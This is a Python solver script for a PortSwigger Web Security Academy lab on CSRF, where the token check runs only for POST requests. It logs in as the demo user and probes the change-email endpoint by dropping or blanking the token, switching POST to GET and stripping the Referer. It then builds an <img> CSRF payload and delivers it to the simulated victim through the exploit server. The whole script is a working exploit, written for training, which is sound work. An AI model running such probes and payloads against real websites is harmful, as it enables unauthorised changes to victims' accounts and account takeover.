#!/usr/bin/env python3
"""
CSRF where token validation depends on request method
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 02-token-validation-request-method.md

What this does:
    Logs in, harvests a legitimate CSRF token from /my-account, then runs the
    same four probes CSRF.py's detect_csrf() runs against
    /my-account/change-email: token omission, blank token, POST->GET method
    switch, and Referer suppression. On this lab the method-switch probe
    succeeds -- the token check only runs inside the POST branch of the
    handler -- so it builds the plain <img> tag craft_csrf_payload() selects
    for that case, which fires a GET carrying the target params, stores it on
    the exploit server, and delivers it to the simulated victim.

Usage:
    python 02-token-validation-request-method.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_csrf(client: httpx.Client, path: str = "/my-account") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _accepted(r: httpx.Response) -> bool:
    """Same generic acceptance heuristic detect_csrf() uses when no custom signal is given."""
    if r.status_code >= 400:
        return False
    text_lower = r.text.lower()
    rejection_phrases = ["invalid csrf", "csrf token", "bad request", "forbidden",
                          "missing token", "token mismatch", "unauthorized"]
    return not any(p in text_lower for p in rejection_phrases)


def detect(client: httpx.Client, url: str, data: dict, token_param: str = "csrf") -> dict:
    """Layer 1 Detector, trimmed to the four probes detect_csrf() runs in CSRF.py."""
    data_no_token = {k: v for k, v in data.items() if k != token_param}
    results = {}

    r = client.post(url, data=data_no_token)
    results["no_token_works"] = _accepted(r)

    r = client.post(url, data={**data, token_param: ""})
    results["blank_token_works"] = _accepted(r)

    r = client.get(url, params=data_no_token)
    results["method_switch_works"] = _accepted(r)

    r = client.post(url, data=data, headers={"Referer": ""})
    results["referer_absent_works"] = _accepted(r)

    return results


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    if not _login(client):
        print("[-] Login as wiener:peter failed.")
        return

    csrf = _get_csrf(client, "/my-account")
    endpoint = f"{lab_url}/my-account/change-email"
    results = detect(client, endpoint, {"csrf": csrf, "email": "test@test.com"})
    print(f"[*] no_token_works={results['no_token_works']}  blank_token_works={results['blank_token_works']}")
    print(f"[*] method_switch_works={results['method_switch_works']}  referer_absent_works={results['referer_absent_works']}")

    if not results["method_switch_works"]:
        print("[-] Method switch not accepted on this instance -- the exploit assumption doesn't hold here.")
        return

    html = f'<html><body>\n<img src="{endpoint}?email=hacker@evil-user.net">\n</body></html>'
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: Method switch: POST->GET via <img>")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- victim's email was changed via the unchecked GET path.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
